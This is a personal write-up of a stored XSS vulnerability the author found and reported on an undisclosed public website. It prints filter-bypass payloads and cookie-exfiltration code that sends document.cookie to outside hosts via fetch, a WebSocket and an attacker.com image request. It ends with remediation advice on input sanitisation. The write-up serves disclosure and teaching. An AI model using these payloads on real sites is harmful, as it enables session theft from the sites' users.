### December 20, 2024 - Undisclosed Company (~40k monthly organic users)

This was the first critical/high severity vulnerability I found on a public website. It was a stored XSS vulnerability that allowed for exfiltration of cookies

### Process 
- I joked to a friend who was on a website that the website looked ancient---it did. Jokingly, I entered into the search bar a simple `"><p>hi</p>`
- Funnily enough, this actually worked, and this was the search result: `hi" style="width: 220px;">`
- Next, I tried executing an alert: `"><script>alert("hi!")</script>`
    - This was caught by website security
- I knew it was vulnerable, so I started going through and checking what I could enter:
```javascript
"><img src="cd" onerror=alert(1) //didn't work (caught by security)
"><img src="cd" onerror=crbwek(bcu) //did work
"><img src="cd" onerror=console.log("bcu") //did work

```
- It seemed to me that they had a blacklist, and it caught several other of the functions I tried. However, I found that I could set attributes of parts of the webpage
```javascript
"><img src="cd" onerror="document.querySelector('blahblah').setAttribute('onmouseover', 'alert(document.cookie)');" // did work
"><img src="cd" onerror="document.querySelector('blahblah').setAttribute('onmouseover', 'a='); // didn't work (caught by security)
```
- Funnily enough, for some reason anything that had an equals sign after the onerror= seemed to get caught by security. This meant that I had to prove credential exfiltration without any equal signs. First, I tried to just see if I could request other sites---If so, I'd just make a POST/GET to a personal webserver
```javascript
"><img src="cd" onerror="document.querySelector('blahblah').setAttribute('onmouseover', `console.log(fetch('https://website.com', { 
  method: 'POST', 
  headers: { 
    'Content-Type': 'application/x-www-form-urlencoded' 
  },
  body: 'cookie' + document.cookie
}));`);"> 

```
- They had a properly configured CORS policy, and I couldn't read the response. I misunderstood this as not being able to send out the request at all, and searched for alternative solutions. After some more experimentation, I found that I could use websockets to exfiltrate data.
```javascript
"><img src="cd" onerror="document.getElementById('pagecontainer')
    .setAttribute('onmouseover', 
        'Object.defineProperty(window, \'socket\', {
             value: new WebSocket(\'wss://self_hosted_websocket\'), writable: true });
        socket.addEventListener(\'open\', function() { 
            socket.send(document.cookie); }); 
        socket.addEventListener(\'message\', function(event) { 
            console.log(\'Received:\', event.data);});
        '
    );
```
- At this point, I had also switched to the page container, so that mouse activity anywhere on the screen would exfiltrate credentials.
- I had also noted by this point that the "name" input of user profiles had the same sanitization as the search bar, so I tested it on a user profile page. 

### Impact
- I had an XSS where I could do essentially anything. I didn't try attempting to execute website queries on their own accounts, but I'm relatively confident that I could.
- However, all I tested before reporting the vulnerability was the above example, for cookie exfiltration.

### Takeaway
- Generally speaking, sanitize your inputs properly. Unsanitized inputs can lead to pretty nasty consequences. 
- This was my full list of remediations that I reported:
    - Sanitize certain characters: ", \, %, (, ), {, }, <, >, : (Generally sanitize input)
    - Add character limits on inputs (First & last name only need 15-25 characters max)
        - Make sure the limit is on the backend, not just in the HTML (user could modify the html & extend input max)
    - CORS Same origin is good, but doesn't stop everything
- Also, don't rely on whitelists/blacklists. They're rarely comprehensive enough to catch everything.

### Reflection
- A few things that are rather embarrassing to admit (to be fair, this was one of my first bugs):
    - I probably didn't need to use websockets at all. I never checked on the other end if the request actually went through. 
    - I probably didn't even need to use fetch, I never considered something like this:
        - `new Image().src = "https://attacker.com/?c=" + document.cookie;`
- This experience highlighted the importance of fully understanding security policies like CORS and exploring the simplest, least complex attack paths. I also learned not to overcomplicate solutions when simpler methods, like query strings, could have worked just as well